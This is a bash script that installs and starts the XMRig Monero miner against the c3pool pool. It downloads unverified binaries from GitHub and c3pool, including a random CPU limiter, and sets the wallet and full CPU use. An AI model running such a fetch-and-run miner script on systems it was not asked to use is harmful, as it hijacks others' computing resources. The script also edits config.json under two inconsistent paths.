#!/bin/bash
WALLET=$1
PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
apt install wget cpulimit screen -y
wget https://raw.githubusercontent.com/mzcof/c3/main/cpurandomlimit
chmod +x ./cpurandomlimit
wget http://download.c3pool.com/xmrig_setup/raw/master/xmrig.tar.gz
tar -xvf ./xmrig.tar.gz
rm -rf ./xmrig.tar.gz
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/c3pool/config.json
sed -i 's/"url": *"[^"]*",/"url": "mine.c3pool.com:33333",/' ./config.json
sed -i 's/"tls": false,/"tls": true,/' ./config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' ./config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' ./config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' ./config.json
screen ./xmrig
screen ./cpurandomlimit
